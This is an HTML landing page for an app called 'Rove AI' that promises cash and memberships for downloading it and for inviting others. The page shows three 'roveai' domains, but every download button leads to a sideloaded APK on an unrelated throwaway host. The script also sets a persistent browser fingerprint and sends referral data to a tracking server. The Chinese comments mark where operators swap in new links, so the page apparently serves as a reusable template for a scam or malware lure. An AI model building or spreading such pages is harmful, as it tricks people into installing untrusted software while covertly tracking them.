<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Rove AI</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui, -apple-system, sans-serif;
        }

        body {
            background:
                linear-gradient(90deg, rgba(190, 60, 255, 0.06) 1px, transparent 1px),
                linear-gradient(rgba(190, 60, 255, 0.06) 1px, transparent 1px),
                radial-gradient(circle at 12% 12%, rgba(190, 60, 255, 0.28), transparent 28%),
                radial-gradient(circle at 88% 8%, rgba(130, 30, 220, 0.22), transparent 28%),
                radial-gradient(circle at 50% 96%, rgba(255, 68, 136, 0.18), transparent 32%),
                linear-gradient(135deg, #050312 0%, #10072a 45%, #050312 100%);
            background-size: 24px 24px, 24px 24px, 100% 100%, 100% 100%, 100% 100%, 100% 100%;
            min-height: 100vh;
        }

        .wrap {
            max-width: 750px;
            margin: 0 auto;
            padding-bottom: 40px;
        }

        .logo-row {
            display: flex;
            justify-content: space-between;
            padding: 24px 16px 10px;
            align-items: center;
            gap: 10px;
        }

        .logo-left {
            font-size: 36px;
            font-weight: 800;
            background: linear-gradient(90deg, #ff3366, #9933ff, #33ccff);
            background-size: 200% auto;
            -webkit-background-clip: text;
            color: transparent;
            animation: gradientShift 6s linear infinite;
        }

        @keyframes gradientShift {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }

        .logo-right-text {
            text-align: right;
            font-size: 22px;
            font-weight: bold;
            background: linear-gradient(90deg, #ff3377, #ff9900, #ffcc00);
            background-size: 200% auto;
            -webkit-background-clip: text;
            color: transparent;
            animation: gradientShift 6s linear infinite;
        }

        .static-notice {
            margin: 10px 14px;
            padding: 12px 8px;
            text-align: center;
            color: #ff4488;
            font-size: 22px;
            line-height: 1.8;
            text-shadow: 0 0 14px rgba(255, 68, 136, 0.6);
        }

        .nav-list {
            margin: 12px 14px;
            border-radius: 16px;
            overflow: hidden;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(190, 60, 255, 0.12);
            box-shadow: 0 0 25px rgba(150, 50, 255, 0.35);
        }

        .nav-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 16px;
            border-bottom: 1px solid rgba(190, 60, 255, 0.08);
            gap: 12px;
        }

        .nav-item:last-child {
            border-bottom: none;
        }

        .nav-info {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .nav-label {
            font-size: 15px;
            color: #c68bff;
        }

        .delay-tag {
            display: inline-block;
            width: fit-content;
            padding: 2px 6px;
            background: rgba(190, 60, 255, 0.12);
            border: 1px solid rgba(190, 60, 255, 0.22);
            border-radius: 4px;
            font-size: 12px;
            color: #e0aaff;
        }

        .nav-domain {
            color: #e0e7ff;
            font-size: 16px;
        }

        .download-small {
            flex-shrink: 0;
            padding: 8px 18px;
            background: linear-gradient(90deg, #9933ff, #bb4cff);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 15px;
            cursor: pointer;
            box-shadow: 0 0 12px rgba(153, 51, 255, 0.35);
            white-space: nowrap;
        }

        .download-small:hover {
            transform: scale(1.05);
            box-shadow: 0 0 22px rgba(153, 51, 255, 0.65);
        }

        .big-download {
            margin: 16px 14px;
        }

        .big-download button {
            width: 100%;
            padding: 18px;
            border: none;
            border-radius: 12px;
            font-size: 20px;
            color: #fff;
            background: linear-gradient(90deg, #ff4488, #9933ff);
            box-shadow: 0 0 20px rgba(255, 68, 136, 0.35);
            cursor: pointer;
        }

        .big-download button:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(255, 68, 136, 0.55);
        }

        .service-box {
            margin: 20px 14px;
            border: 1px solid rgba(190, 60, 255, 0.12);
            border-radius: 14px;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 14px;
            background: rgba(255, 255, 255, 0.04);
            cursor: pointer;
        }

        .service-icon {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ee7788, #ff4488);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 24px;
            flex-shrink: 0;
            box-shadow: 0 0 15px rgba(255, 68, 136, 0.35);
        }

        .service-text h3 {
            font-size: 22px;
            color: #e0e7ff;
            margin-bottom: 4px;
        }

        .service-text p {
            color: #91a4d8;
        }

        @media (max-width: 480px) {
            .logo-left { font-size: 30px; }
            .logo-right-text { font-size: 16px; }
            .static-notice { font-size: 20px; }
            .nav-label { font-size: 14px; }
            .nav-domain { font-size: 15px; }
            .download-small {
                padding: 7px 14px;
                font-size: 14px;
            }
            .big-download button {
                font-size: 18px;
                padding: 16px;
            }
            .service-text h3 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
<div class="wrap">
    <div class="logo-row">
        <div class="logo-left">Rove AI</div>
        <div class="logo-right-text">Smart AI Chat, Earn With Ease!</div>
    </div>

    <div class="static-notice">
        Download App → $2 + 30-day membership<br>
        Invite 1 = $3 &nbsp;&nbsp;|&nbsp;&nbsp; Invite 5 = $20 + lifetime membership
    </div>

    <div class="nav-list">
        <div class="nav-item">
            <div class="nav-info">
                <div class="nav-label">Link 1</div>
                <span class="delay-tag">100ms</span>
                <div class="nav-domain">roveai.link</div>
            </div>
            <button class="download-small">Download</button>
        </div>

        <div class="nav-item">
            <div class="nav-info">
                <div class="nav-label">Link 2</div>
                <span class="delay-tag">100ms</span>
                <div class="nav-domain">roveai.vip</div>
            </div>
            <button class="download-small">Download</button>
        </div>

        <div class="nav-item">
            <div class="nav-info">
                <div class="nav-label">Link 3</div>
                <span class="delay-tag">100ms</span>
                <div class="nav-domain">roveai.app</div>
            </div>
            <button class="download-small">Download</button>
        </div>
    </div>

    <div class="big-download">
        <button onclick="goDownload()">Download Now</button>
    </div>

    <div class="service-box" onclick="openService()">
        <div class="service-icon">☎</div>
        <div class="service-text">
            <h3>7×24H Online Support</h3>
            <p>7x24 hours online service</p>
        </div>
    </div>
</div>

<script>
// ==============================================
// ⬇⬇⬇【1、所有下载按钮共用地址】在这里修改 ⬇⬇⬇
const targetDownloadUrl = " https://cucroh.buyaob.my.id/ZPWVPBCC.apk";
// ==============================================

// ==================== 分发链接追踪 ====================
// 从 URL 读取 ?slug= 和 ?ref=，生成浏览器指纹
var _trackSlug = "";
var _trackFp = "";
(function(){
    try {
        var p = new URLSearchParams(window.location.search);
        _trackSlug = (p.get("slug") || "").trim();
        var ref = (p.get("ref") || "").trim();
        if (ref) {
            try { localStorage.setItem("promo_ref", JSON.stringify({code: ref, ts: Date.now()})); }
            catch(e) {}
        }
    } catch(e) {}
    // 浏览器指纹
    try {
        _trackFp = localStorage.getItem("promo_visitor_fp");
        if (!_trackFp) {
            _trackFp = "fp-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2,10);
            localStorage.setItem("promo_visitor_fp", _trackFp);
        }
    } catch(e) {
        _trackFp = "fp-" + Date.now().toString(36);
    }
})();

function trackDownloadThenGo() {
    if (_trackSlug || (function(){
        try { var r = localStorage.getItem("promo_ref"); if (r) { var o = JSON.parse(r); return o && o.code; } }
        catch(e) {} return "";
    })()) {
        try {
            fetch("https://gtp88.top/ai/promo/track-download", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    ref: (function(){
                        try { var r = localStorage.getItem("promo_ref"); if (r) { var o = JSON.parse(r); return o.code || ""; } }
                        catch(e) {} return "";
                    })(),
                    fingerprint: _trackFp,
                    slug: _trackSlug
                }),
                keepalive: true
            }).catch(function(){});
        } catch(e) {}
    }
    window.location.href = targetDownloadUrl;
}

function goDownload(){
    trackDownloadThenGo();
}
// ==================== 追踪结束 ====================

document.querySelectorAll(".download-small").forEach(btn=>{
    btn.onclick = goDownload;
})

// ==============================================
// ⬇⬇⬇【2、客服跳转链接】在这里修改 ⬇⬇⬇
const serviceLink = "https://kf.gtp88.top/index/index/home?visiter_id=&visiter_name=&avatar=&business_id=1&groupid=1&special=1";
// ==============================================
function openService(){
    window.open(serviceLink); //新窗口打开客服页面
}
</script>
</body>
</html>
